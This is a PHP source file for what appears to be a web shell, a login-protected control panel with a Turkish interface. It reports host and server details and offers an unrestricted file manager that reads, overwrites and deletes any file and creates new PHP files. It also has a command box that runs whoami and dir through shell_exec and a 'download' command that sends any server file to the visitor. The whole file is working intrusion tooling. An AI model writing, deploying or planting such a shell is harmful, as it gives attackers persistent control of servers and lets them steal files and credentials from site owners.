<?php
session_start();
error_reporting(0);




if (!isset($_SESSION['logged'])) {
    header("Location: Login.php");
    exit();
}



if (isset($_GET['act']) && $_GET['act'] === 'logout') {
    session_unset();
    session_destroy();
    header("Location: Login.php");
    exit();
}








?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/main.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <title>Document</title>
</head>

<body>

    <div id="div_out">
        <li class="out_back"><a href="?act=logout" id="out">Logout</a></li>
        <li class="time"><?php echo date("H:i:s"); ?></li>
    </div>

    <div class="container">
        <div class="information">
            <?php
            echo '<span class="inf">Machine:</span> ' . php_uname() . "<br>";
            echo  '<span class="inf">Server:</span> ' . $_SERVER['SERVER_SOFTWARE'] . "<br>";
            echo '<span class="inf">Name:</span> ' . get_current_user() . "<br>";
            echo '<span class="inf">Server IP:</span> ' . gethostbyname($_SERVER['HTTP_HOST']) . "<br>";
            echo '<span class="inf">Your IP Address:</span> ' . $_SERVER['REMOTE_ADDR'] . "<br>";

            ?>
        </div>



        <!-- Menu ıtems is here -->

        <div class="menu">

            <li><a class="menu_items" href="?act=info" id="info">info</a></li>
            <li><a href="?act=f_menager" class="menu_items">File Menager</a></li>
            <li><a href="?act=Search" class="menu_items">Search</a></li>
            <li><a href="?act=Command" class="menu_items">Command</a></li>
            <li><a href="?act=Help" class="menu_items">Help</a></li>
        </div>


        <!-- My clas for functions -->
        <div class="islemler" id="islemler">
            <?php

            function logo()
            {
                $r = '';
                $r .= '<br><br>';

                $r .= "<div class='logo_cont'>";
                $r .= "<img class= 'myLogo'src='img/logo.png'>";
                $r .= "<img class= 'myLogo2' src='img/sibervatan_renkli.png'>";
                $r .= "<img class= 'myLogo'src='img/logo.png'>";
                $r .= "</div>";

                return $r;
            }

            class fonksiyonlar
            {
                // function for informaion about machine//
                function infoser()
                {
                    echo " <br><br>";
                    echo '<span class="inf">Machine:</span> ' . php_uname() . "<br>";
                    echo  '<span class="inf">Server:</span> ' . $_SERVER['SERVER_SOFTWARE'] . "<br>";
                    echo '<span class="inf">Name:</span> ' . get_current_user() . "<br>";
                    echo '<span class="inf">Server IP:</span> ' . gethostbyname($_SERVER['HTTP_HOST']) . "<br>";
                    echo '<span class="inf">Your IP Address:</span> ' . $_SERVER['REMOTE_ADDR'] . "<br>";
                }

                // OUR LOGO






                //function for file menager//
                static function dizin($dizin_yolu)
                {


                    if (!is_dir($dizin_yolu) || is_file($dizin_yolu)) {
                        if (is_file($dizin_yolu)) {

                            echo "DOSYA:  " . htmlspecialchars($dizin_yolu) . "<br><br>";
                            $fopen = fopen($dizin_yolu, 'r');
                            $icerik = fread($fopen, filesize($dizin_yolu));
                            fclose($fopen);

                            $r = "";
                            $r .= "<form method='POST'>";
                            $r .= "<div class='show_file'>";
                            $r .= "<textarea name='read_File'> $icerik </textarea> ";
                            $r .= "<div class='container_of_the_AER twice_class_for_files'>
    
                                 <div class='editfie'><Button type='submit'>Edit</div>
                                 <div class='deletefile'><a href='?action=del_file&d=" . urlencode($dizin_yolu) . "'>Delete </a></div>  
                                 </div>";
                            $r .= "</div>";
                            $r .= "</form>";

                            echo $r;








                            if (isset($_POST['read_File'])) {
                                $eklenen = $_POST['read_File'];
                                $fopen = fopen($dizin_yolu, 'w');
                                fwrite($fopen,  $eklenen);
                                fclose($fopen);

                                echo "Değişiklikler Kaydedildi!";
                                header("Location: " . $_SERVER['REQUEST_URI']);
                                exit();
                            }
                        } else {
                            echo "Geçersiz dizin yolu: " . htmlspecialchars($dizin_yolu);
                        }
                        return;
                    }



                    $dir = opendir($dizin_yolu);
                    $v = ($dizin_yolu != ".") ? $dizin_yolu . "/" : "";


                    while (($item = readdir($dir)) !== false) {




                        if (is_dir($v . $item)) {
                            echo '<div class="isdir"><a href="?action=opendir&d=' . $v . $item . '">' . $item . '</a></div>';
                        }


                        if (is_file($v . $item)) {
                            echo '<div class="isfile"><a href="?action=openfile&f=' . $v . $item . '">' . $item . '</a></div>';
                        }
                    }




                    echo 
                    
                        "<div class='container_of_the_AER'>
                        <div class='addfile'> Add <i class='bx bx-chevrons-down'></i>
                        <li><a href='?action=addfile&d=" . urlencode($dizin_yolu) . "'>New File</a></li> 
                        <li><a href='?action=addfolder&d=" . urlencode($dizin_yolu) . "'>New Folder</a></li>
                        </div> 
                        <div class='editfie'><a href='?action=ed_file&d=" . urlencode($dizin_yolu) . " '>Edit </a></div>
                        <div class='deletefile'><a href='?action=del_file&d=" . urlencode($dizin_yolu) . "'>Delete </a></div> 
                        </div>";


                    closedir($dir);
                    chdir($dizin_yolu);
                    echo  " <div class='Show_dir'>" . htmlspecialchars(getcwd())  . "</div>";
                }





                // A Function For adding new dolder or new file
                static function newFolder($dizin_yolu, $tur)
                {

                    // if item in constructor is folder,
                    if ($tur === "klasor") {
                        if (isset($_POST['folder_name'])) {
                            $newFolderName = htmlspecialchars($_POST['folder_name']);

                            $fullPath = rtrim($dizin_yolu, '/') . '/' . $newFolderName;


                            if (!file_exists($fullPath)) {
                                mkdir($fullPath);
                                echo "<p>Klasör başarıyla oluşturuldu: $newFolderName</p>";
                            } else {
                                echo "<p>Klasör zaten var:<span class='hata_message'> $newFolderName </span></p>";
                            }
                        }

                        echo '<div class="newitem_container">';
                        echo "<form method='POST'>";
                        echo '<div class="newitem"> ';
                        echo "<div class='Show_dir_in_form'> DİZİN: " . $dizin_yolu . "</div>";
                        echo "<input type='text' name='folder_name' placeholder='Yeni Klasör Adı' required>";
                        echo "<input type='submit' value='Klasör Oluştur'>";
                        echo "</div>";
                        echo "</form>";
                        echo "</div>";



                        // if item in constructor is file,
                    } elseif ($tur === "dosya") {

                        if (isset($_POST['file_name'])) {
                            $valid_extensions = ['txt', 'png', 'php', 'pdf', 'html'];

                            $newFileName = htmlspecialchars($_POST['file_name']);
                            $extension = pathinfo($newFileName, PATHINFO_EXTENSION);

                            if (!in_array($extension, $valid_extensions)) {
                                echo "<p >Geçerli Uzantıyı gir! <span class='hata_message'>(txt , jpg , png , pdf, html)</span></p>";
                            } else {

                                $fullPath = rtrim($dizin_yolu, '/') . '/' . $newFileName;

                                if (!file_exists($fullPath)) {
                                    touch($fullPath);


                                    $eklenen = "Edit Yaparken önce değişikliği yapın ardından edit düğmesine basın...";
                                    $fopen = fopen($fullPath, 'w');
                                    fwrite($fopen,  $eklenen);
                                    fclose($fopen);



                                    echo "<p>Dosya Başarıyla Oluşturuldu: $newFileName</p>";
                                } else {
                                    echo "<p >Dosya zaten var: <span class='hata_message'> $newFileName </span></p>";
                                }
                            }
                        }


                        echo '<div class="newitem_container">';
                        echo "<form method='POST'>";
                        echo '<div class="newitem"> ';
                        echo "<div class='Show_dir_in_form'> DİZİN: " . $dizin_yolu . "</div>";
                        echo "<input type='text' name='file_name' placeholder='Dosya adı: (example.txt)' required>";
                        echo "<input type='submit' value='Dosya Oluştur'>";
                        echo "</div>";
                        echo "</form>";
                        echo "</div>";
                    }
                }



                //A function for serach form

                function search_form()
                {


                    echo "SEARCH HOSGELDİN";

                    $r = "";
                    $r .= '<div class="searach_container">';
                    $r .= "<form method='GET' action=''>";
                    $r .= "<input name='search_dir' type='text' placeholder='Search...'>";
                    $r .= '<button type="submit">Ara</button>';
                    $r .= '<input type="hidden" name="action" value="searching">';
                    $r .= "</form></div>";
                    echo $r;
                }


                static function commands($isRetun, $komut)
                {
                    $r = "";
                    $r .= "<div class = 'command_container' > ";
                    $r .= "<div class = 'command_container_1' > ";
                    $r .= "<form method = 'GET' action= ''>  ";
                    $r .= "<span class= 'cur_usr'>";
                    $r .= get_current_user() . "->";
                    $r .= "</span>";
                    $r .= "<input name = 'command' type = 'text'  autofocus  autocomplete='off'> <br><br>";

                    if ($isRetun == true) {



                        $r .= "<pre>" . $komut . "</pre>";
                    }


                    $r .= "<input type = 'hidden' name = 'action' value='cmd'> ";
                    $r .= "</form></div></div>";
                    echo $r;
                }


                function help() {
                    $r = "";
                    $r .= "<div class = 'help_container' > ";
                    $r .= "<p>";
                    $r .= "Sistemimiz görünüş bakımından sade ve göz yoruculuğu azaltılmış bir şekilde hizmete sunulmuştur. <br><br>" . 
                          "İnfo butonu bağlantı kuran bilgisayar hakkında bilgi verir. <br><br>". 
                          "File Menager sayesinde sistemde olan dosyaları gezebilir, değiştirebilir, hatta silebilirsiniz. <br><br>" . 
                          "Search ile arama yapabilirsiniz. <br><br>" . 
                          "Comman ile komut yazabileceğiniz bir pencereye yönlendirileceksiniz. (basit seviye) help parametresi ile komutlarınızı öğrenebilirsiniz. <br><br>" . 
                          "Sistemimize Hoşgeldiniz! İyi Vakit Geçirin!";
                    $r .= "</p>";
                          echo $r;

                }
            }

           


            $r = '';


            $islem = new fonksiyonlar();
            $log = '';
            $log = logo();

            if (!isset($_GET['act']) && !isset($_GET['action'])) {
                echo $log;
            }

            if (isset($_GET['act'])) {
                switch ($_GET['act']) {
                    case 'info':
                        $r .= $islem->infoser();
                        break;

                    case 'f_menager':
                        $r =  $islem->dizin('.');
                        break;

                    case 'Search':
                        $r =   $islem->search_form();
                        break;

                    case 'Command':

                        $StartingFunc = false;
                        $nullCommand = "";
                        $r =    $islem->commands($StartingFunc, $nullCommand);
                        break;

                    case 'Help':
                        $r = $islem ->help();
                        break;
                }
            }




            if (isset($_GET['action'])) {
                switch ($_GET['action']) {
                    case 'opendir':
                        $d = strip_tags($_GET['d']);
                        fonksiyonlar::dizin($d);
                        break;

                    case 'openfile':
                        $f = strip_tags($_GET['f']);
                        fonksiyonlar::dizin($f);
                        break;

                    case 'addfolder':
                        $d = strip_tags($_GET['d']);
                        $t = "klasor";
                        fonksiyonlar::newFolder($d, $t);
                        break;

                    case 'addfile':
                        $d = strip_tags($_GET['d']);
                        $t = "dosya";
                        fonksiyonlar::newFolder($d, $t);
                        break;

                    case 'ed_file':
                        $d = strip_tags($_GET['d']);
                        if (is_dir($d)) {
                            echo "Hatalı Seçim: <span class='hata_message'> $d , bir klasör</span>";
                        } else if (is_file($d)) {
                            $d = strip_tags($_GET['d']);
                            echo $d;
                            fonksiyonlar::dizin($d);
                        }
                        break;

                    case 'del_file':
                        $d = strip_tags($_GET['d']);
                        if (is_dir($d)) {
                            rmdir($d);
                            echo 'Klasör Başarıyla Silindi!';
                            exit();
                        } elseif (is_file($d)) {
                            unlink($d);
                            echo 'Dosya Başarıyla Silindi!';
                            exit();
                        }

                    case 'searching':
                        if (isset($_GET['search_dir'])) {

                            if (!empty($_GET['search_dir'])) {
                                $search_dir = htmlspecialchars($_GET['search_dir']);
                                echo $search_dir;
                                fonksiyonlar::dizin($search_dir);
                            }
                        }
                        break;


                    case 'cmd':
                        if (isset($_GET['command']) && (!empty($_GET['command']))) {

                            $mycommand = htmlspecialchars($_GET['command']);
                            $parts = explode(" ", $mycommand);
                            $command_name = $parts[0];

                            switch ($command_name) {



                                case 'whoami':
                                    $output = shell_exec('whoami');
                                    $return = true;
                                    fonksiyonlar::commands($return, $output);
                                    break;

                                case 'dir':
                                    $output = shell_exec('dir/b');
                                    $formatted_output = nl2br(htmlspecialchars($output));
                                    $return = true;
                                    fonksiyonlar::commands($return, $output);
                                    break;

                                case 'download':

                                    $commandParts = explode(' ', $_GET['command']);


                                    if (count($commandParts) > 1) {
                                        
                                        $file = trim(implode(' ', array_slice($commandParts, 1)));


                                        if (file_exists($file) && is_file($file)) {

                                            header('Content-Description: File Transfer');
                                            header('Content-Type: application/octet-stream');
                                            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                                            header('Expires: 0');
                                            header('Cache-Control: must-revalidate');
                                            header('Pragma: public');
                                            header('Content-Length: ' . filesize($file));
                                            readfile($file);
                                            exit;

                                        } else {
                                            $output = "Dosya bulunamadı.";
                                        }
                                    } else {
                                        $output = "Dosya adı belirtilmedi.";
                                    }
                                    break;


                                case 'help':
                                    $help = "";
                                    $help .= "<span class='help_element'>dir:</span> List items in current directory <br><br>";
                                    $help .= "<span class='help_element'>whoami:</span> User information for the user who is currently logged on to the local system. <br><br>";
                                    $help .= "<span class='help_element'>download:</span> Install file from data. <br><br>";
                                    $help .= "<span class='help_element'>help:</span> help for using comand system. <br><br>";
                                    $help .= "<span class='help_element'>Date:</span> Show Date <br><br>";


                                    $return = true;
                                    fonksiyonlar::commands($return, $help);
                                    break;

                                case 'date' :
                                    $output =  date("d-m-Y      H:i");
                                    $return = true;
                                    fonksiyonlar::commands($return, $output);
                                    break;



                                default:

                                    $output = 'Komut geçerli değil';
                                    $return = true;
                                    fonksiyonlar::commands($return, $output);
                                    break;
                            }
                        } else if (empty($_GET['command'])) {
                            $output = 'Komut geçerli değil';
                            $return = true;
                            fonksiyonlar::commands($return, $output);
                            break;
                        }
                }
            }

            echo $r;

            ?>
        </div>



    </div>





</body>

</html>